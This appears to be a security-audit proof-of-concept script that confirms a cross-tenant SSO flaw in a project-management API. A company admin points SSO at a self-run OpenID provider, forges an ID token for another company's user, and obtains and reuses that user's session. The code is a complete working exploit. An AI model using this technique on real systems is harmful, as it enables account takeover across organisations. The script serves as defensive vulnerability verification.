'use strict';
/**
 * L10 — SSO sign-in resolves the identity by e-mail across ALL organisations.
 *
 * A company admin of workspace 024 can configure 024's SSO to point at an
 * identity provider THEY control (the config endpoint proves no ownership of
 * the issuer, the client, or the e-mail domains) and declare the e-mail domain
 * of ANOTHER company (025). When 024's IdP then asserts an existing 025 user's
 * e-mail, the SSO callback finds that user globally by e-mail, provisions a
 * membership in 024 and issues a session for an identity 024 never created or
 * invited. That session is then exchanged into 025, giving 024's operator a
 * live session as the victim inside the victim's own company.
 *
 * To drive the real /auth/sso/* endpoints of the running API we stand up a
 * throwaway OpenID Connect provider on 127.0.0.1 (an ephemeral port, closed at
 * the end) — the "test IdP" the lead calls for. The attacker controls this IdP
 * in exactly the way a real attacker controls one they stand up themselves.
 *
 * Victim V is a throwaway created only in 025; no persona is touched.
 */
const http = require('http');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const { as, raw, API } = require('../lib/api');

const PASSWORD = process.env.CERT_PASSWORD; // read, never printed
const stamp = Date.now();
const victimEmail = `l10.victim.${stamp}@c025.octapm-cert.test`; // lives in 025, domain belongs to 025
const victimName = 'L10 SSO Victim';
const CLIENT_ID = 'octapm-cert-attacker-idp';
const CLIENT_SECRET = 'attacker-chosen-secret';

const show = (label, res) => {
  console.log(`\n${label}`);
  console.log('  status:', res.status);
  const body = res.body !== undefined ? res.body : res;
  console.log('  body  :', typeof body === 'string' ? body.slice(0, 400) : JSON.stringify(body));
};

// ── the attacker-controlled OpenID Connect provider ────────────────────────
const startIdp = () => new Promise((resolve) => {
  const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
  const jwk = { ...publicKey.export({ format: 'jwk' }), kid: 'attacker-key-1', use: 'sig', alg: 'RS256' };
  let issuer = null; // set once we know the port
  let nextClaims = null; // the e-mail/sub the attacker wants asserted
  const server = http.createServer((req, res) => {
    const send = (obj) => { res.writeHead(200, { 'content-type': 'application/json' }); res.end(JSON.stringify(obj)); };
    if (req.url.startsWith('/.well-known/openid-configuration')) {
      return send({ issuer, authorization_endpoint: `${issuer}/authorize`, token_endpoint: `${issuer}/token`, jwks_uri: `${issuer}/keys`, scopes_supported: ['openid', 'email', 'profile'], code_challenge_methods_supported: ['S256'] });
    }
    if (req.url.startsWith('/keys')) return send({ keys: [jwk] });
    if (req.url.startsWith('/token')) {
      const idToken = jwt.sign(nextClaims, privateKey, { algorithm: 'RS256', keyid: 'attacker-key-1', expiresIn: '5m', issuer, audience: CLIENT_ID });
      return send({ id_token: idToken, access_token: 'attacker-at', token_type: 'Bearer' });
    }
    res.writeHead(404); res.end('{}');
  });
  server.listen(0, '127.0.0.1', () => {
    const port = server.address().port;
    issuer = `http://127.0.0.1:${port}`;
    resolve({ server, issuer, setClaims: (c) => { nextClaims = c; } });
  });
});

(async () => {
  const idp = await startIdp();
  console.log('attacker IdP listening at', idp.issuer);
  try {
    const pm24 = as('pm@c024.octapm-cert.test');
    const pm25 = as('pm@c025.octapm-cert.test');
    const org24 = (await pm24.GET('/auth/me')).active.orgId;
    const org25 = (await pm25.GET('/auth/me')).active.orgId;

    // 1. Victim V exists ONLY in 025 (024 never created or invited it).
    const v = await pm25.POST('/users', { name: victimName, email: victimEmail, password: PASSWORD, role: 'qs' });
    console.log('\n[setup] victim V created in 025 only, id =', v.id, 'role in 025 = qs');
    const inA = await pm24.GET(`/users?search=${encodeURIComponent(victimEmail)}`);
    console.log('[setup] V present in 024 before attack?', (inA.items || []).some((u) => u.email === victimEmail));

    // 2. 024 admin points 024's SSO at the attacker IdP and declares 025's domain.
    const cfg = await pm24.send('PUT', '/company/security/sso', {
      enabled: true, issuer: idp.issuer, clientId: CLIENT_ID, clientSecret: CLIENT_SECRET,
      domains: ['c025.octapm-cert.test'], autoProvision: true, defaultRole: 'site_engineer',
    });
    show('[attack] PUT /company/security/sso on 024 (issuer = attacker IdP, domain = 025)', cfg);

    // 3. Begin SSO for 024; read the nonce the server embedded.
    const startRes = await raw('POST', '/auth/sso/start', { json: { orgId: org24 } });
    show('[attack] POST /auth/sso/start {orgId: 024}', startRes);
    const authUrl = new URL(startRes.body.data.authorizationUrl);
    const nonce = authUrl.searchParams.get('nonce');
    const state = authUrl.searchParams.get('state');

    // 4. The attacker IdP will assert the VICTIM's e-mail.
    idp.setClaims({ sub: 'attacker-subject-for-victim', email: victimEmail, email_verified: true, name: victimName, nonce });

    // 5. Hit the real callback. Do NOT follow the 302 (it points at :5173).
    const cbUrl = `${API}/auth/sso/callback?code=attacker-code&state=${encodeURIComponent(state)}`;
    const cbRes = await fetch(cbUrl, { redirect: 'manual' });
    const location = cbRes.headers.get('location') || '';
    console.log('\n[attack] GET /auth/sso/callback -> status', cbRes.status);
    console.log('  redirect Location:', location);
    const ticket = location.includes('ssoError')
      ? null
      : new URL(location, 'http://x').searchParams.get('ticket');
    console.log('  one-time ticket issued:', Boolean(ticket));

    // 6. Exchange the ticket for the real session — bound to 024, as V.
    let sessionInA = null;
    if (ticket) {
      const complete = await raw('POST', '/auth/sso/complete', { json: { ticket } });
      show('[attack] POST /auth/sso/complete', complete);
      sessionInA = complete.body?.data || null;
    }
    const gotSessionForVictim =
      Boolean(sessionInA?.tokens?.accessToken) && sessionInA.user?.email === victimEmail && sessionInA.user?.orgId === org24;

    // 7. Now V is a forced member of 024, and we hold V's session. Exchange into 025.
    let enteredVictimCompany = false; let roleInB = null; let projStatus = null;
    if (gotSessionForVictim) {
      const token24 = sessionInA.tokens.accessToken;
      const sess25 = await raw('POST', `/auth/workspaces/${org25}/session`, { token: token24 });
      show('[attack] exchange 024 session into 025 as V', sess25);
      const d = sess25.body?.data || {};
      roleInB = d.user?.role;
      enteredVictimCompany = sess25.status === 200 && d.user?.orgId === org25 && Boolean(d.tokens?.accessToken);
      if (enteredVictimCompany) {
        const proj = await raw('GET', '/projects', { token: d.tokens.accessToken });
        projStatus = proj.status;
        console.log('\n[attack] acting as V inside 025: GET /projects ->', proj.status);
      }
    }

    console.log('\n--- assessment ---');
    console.log('  024 obtained a session for an identity it never created/invited:', gotSessionForVictim);
    console.log('  that session exchanges into the victim\'s real company 025      :', enteredVictimCompany, '(role', roleInB + ')');
    console.log('  and reads 025 project data as the victim                        :', projStatus === 200);

    const confirmed = gotSessionForVictim && enteredVictimCompany && projStatus === 200;

    // tidy up: disable 024's SSO so the shared workspace is left as found.
    await pm24.send('PUT', '/company/security/sso', { enabled: false }).catch(() => {});

    if (confirmed) {
      process.exitCode = 2;
      console.log('\nVERDICT L10: CONFIRMED — an admin of 024 pointed 024\'s SSO at an IdP they control, declared 025\'s e-mail domain, and the callback resolved an existing 025 identity by e-mail, force-joined it to 024 and issued a session that exchanges into 025 as the victim. SSO configured by one company yields a cross-tenant session for an identity it never created, bypassing authentication.');
    } else {
      process.exitCode = 0;
      console.log('\nVERDICT L10: NOT_REPRODUCED — the SSO flow did not yield a cross-tenant session for the foreign identity.');
    }
  } finally {
    idp.server.close();
  }
})().catch((e) => { console.error('ERROR', e.stack || e.message); process.exitCode = 1; });
